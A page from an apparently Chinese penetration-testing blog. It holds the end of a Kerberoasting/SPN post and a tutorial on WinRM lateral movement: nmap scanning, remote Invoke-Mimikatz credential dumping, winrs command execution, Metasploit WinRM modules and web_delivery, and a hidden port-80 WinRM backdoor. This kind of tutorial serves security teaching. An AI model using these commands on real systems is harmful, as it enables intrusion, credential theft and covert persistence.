<p>此时为域内用户administrator添加了一个SPN，在域内任何一台主机上都可以获得本SPN，并能使用Kerberoast获得TGS</p>
<p>在后续需要使用时请求服务，获取TGS使用Hashcat破解即可</p>
<p>Ps:写这玩意犯困，困了我好多次呢= =</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-WinRM-横向移动" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="article-date">
      <time datetime="2021-09-26T07:08:44.000Z" itemprop="datePublished">2021-09-26</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">WinRM-横向移动</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><strong>WinRM 用于Windows远程管理，他允许管理员远程执行系统命令。通过HTTP(5985) 或 HTTPS SOAP(5986)进行执行，支持Kerberos以及NTLM身份验证以及基本身份验证。使用此服务需要管理员票据。</strong></p>
<p>假设我们已经获得一台内网服务器的管理员权限(对端服务器允许此用户登陆即可)，并且开启了WinRM管理服务器，那么我们可以利用凭证进行内网横向移动</p>
<p>开放端口5985的主机运行WInRM服务，可利用端口扫描工具进行探测确认。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV --open -p5985 <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span><span class="number">-12</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926195057008.png" alt="image-20210926195057008"></p>
<p>如果此时端口5985打开但端口5986已经被关闭，此时WinRM服务配置为仅接受HTTP连接，并加密</p>
<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192658012.png" alt="image-20210926192658012"></p>
<p>利用Poershell Invoke-Command 可通过WinRM服务执行命令。</p>
<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192711834.png" alt="image-20210926192711834"></p>
<p>同时我们还可利用 <strong>WinRM</strong> 远程执行Mimikatz来导出内存中的票据，无需将Mimikatz放入目标机器中执行。</p>
<p>此处使用Mimikatz导出票据，前提条件是你已获得管理员权限，否则将会导出失败。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ./Invoke-Mimikatz.ps1</span><br><span class="line">Invoke-Mimikatz -ComputerName TARGET</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192725400.png" alt="image-20210926192725400"></p>
<p>利用导出的凭证，继续横向渗透。</p>
<p>对于不运行 <strong>WinRM</strong> 的系统，可以利用Powershell命令进行启用配置。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192736459.png" alt="image-20210926192736459"></p>
<p>默认情况下，可能无法通过 WinRM 连接到另一个系统， 并且可能需要额外的配置。 以下配置可能帮助我们解决配置错误问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Winrm quickconfig</span><br><span class="line">winrm set winrm/config/client @&#123;AllowUnencrypted = &quot;true</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br></pre></td></tr></table></figure>

<h2 id="WinRs"><a href="#WinRs" class="headerlink" title="WinRs"></a>WinRs</h2><p>WinRS 是一个命令行工具，它是Windows 2008及更高版本的一部分。如果启用了WinRM,此实用程序可用于远程执行主机上的命令。在CMD参数上可建立一个新的远程cmd会话。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192758398.png" alt="image-20210926192758398"></p>
<p>也可对其远程执行命令而非一个cmd会话，以便对目标远程探测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;net localgroup administrators&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192808642.png" alt="image-20210926192808642"></p>
<p>也可利用msf 的 web_delivery模块远程无文件上线msf。此模块将生成一个将在本地托管的有效载荷，并将生成需要在目标上执行的powershell命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use multi/script/web_delivery</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192818719.png" alt="image-20210926192818719"></p>
<p><strong>利用winrs远程执行:</strong></p>
<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192827384.png" alt="image-20210926192827384"></p>
<h2 id="元破解"><a href="#元破解" class="headerlink" title="元破解"></a>元破解</h2><p>MSF 有几个模块，可用于发现开启了WinRM服务的主机、发现凭证以进行服务身份验证以及执行任意命令和代码。以下模块可以发现启用了WinRM 服务的系统机器支持的身份验证协议。</p>
<h3 id="探测WinRM验证方式"><a href="#探测WinRM验证方式" class="headerlink" title="探测WinRM验证方式"></a>探测WinRM验证方式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_auth_methods</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192845668.png" alt="image-20210926192845668"></p>
<h3 id="探测票据有效性"><a href="#探测票据有效性" class="headerlink" title="探测票据有效性"></a>探测票据有效性</h3><p>如果已经获得服务器上的缓存票据，则这些票据可用于通过<strong>WinRM</strong>服务与其他主机进行身份验证。以下模块可检测票据是否对其他主机有效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_login </span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192855464.png" alt="image-20210926192855464"></p>
<h3 id="利用票据执行命令"><a href="#利用票据执行命令" class="headerlink" title="利用票据执行命令"></a>利用票据执行命令</h3><p>通过<strong>WinRM</strong> 服务执行任意命令。此模块需要本地管理员凭据、域和目标主机。</p>
<p>此处未能成功执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192903042.png" alt="image-20210926192903042"></p>
<p>也可利用WinRM和以下模块执行命令。该模块需要本地管理员凭证和代码将执行的主机列表。此模块可用于横向移动到域内主机。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/winrm/winrm_script_exec</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192912391.png" alt="image-20210926192912391"></p>
<h2 id="其他利用手段"><a href="#其他利用手段" class="headerlink" title="其他利用手段"></a>其他利用手段</h2><p>​    <strong>1.开启3389远程桌面控制</strong></p>
<p>​    若开启了WinRM,可利用PeekABoo工具或直接对注册表操作开启3389端口</p>
<p>​    <strong>2.端口复用做后门</strong></p>
<p>​    将WInRM监听端口由5985改为80或443等常用端口，及时端口被Web服务占用也不会影响，并且不会影响web服务的执行：</p>
<p>​    （1）配置目标WinRM服务，更改监听端口开启复用模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</span><br><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>​    （2）链接目标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.1.152 -u:administrator -p:xxxx cmd</span><br></pre></td></tr></table></figure>

<p>​    此方法适用于存在web服务的主机，并不会再开启新端口，较为隐蔽。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
  

</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2021 Nayon|1163875625@qq.com
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >极客到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>


<script src="/js/main.js"></script>


    <script>
        $(document).ready(function() {
            var backgroundnum = 1;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'xxxxx', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



	<script>
	var _hmt = _hmt || [];
	(function() {
	  var hm = document.createElement("script");
	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
	  var s = document.getElementsByTagName("script")[0]; 
	  s.parentNode.insertBefore(hm, s);
	})();
	</script>



<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(
            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>